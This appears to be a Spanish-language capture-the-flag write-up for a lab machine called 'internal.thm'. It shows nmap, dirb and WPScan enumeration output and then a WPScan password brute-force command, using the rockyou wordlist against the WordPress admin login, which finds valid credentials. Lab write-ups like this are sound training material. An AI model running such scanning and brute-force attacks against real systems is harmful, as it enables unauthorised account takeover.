1. **Modificar el archivo /etc/hosts**

        - IP internal.thm

2. **Nmap** 

        - sudo nmap -sV -sC -Pn -v 10.10.17.84 -o port_scan

3. **Uso de dirb**
 ````
---- Scanning URL: http://10.10.17.84/ ----
==> DIRECTORY: http://10.10.17.84/blog/
+ http://10.10.17.84/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://10.10.17.84/javascript/
==> DIRECTORY: http://10.10.17.84/phpmyadmin/
+ http://10.10.17.84/server-status (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.17.84/wordpress/
 ````

4. **Escaneo en Wordpress**
 ````
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 
[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a f>
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
  ````
5. **Fuerza bruta en Wordpress**
        - wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
 ````
 [!] Valid Combinations Found:
 | Username: admin, Password: *******
Correo: admin@internal.thm
 ````
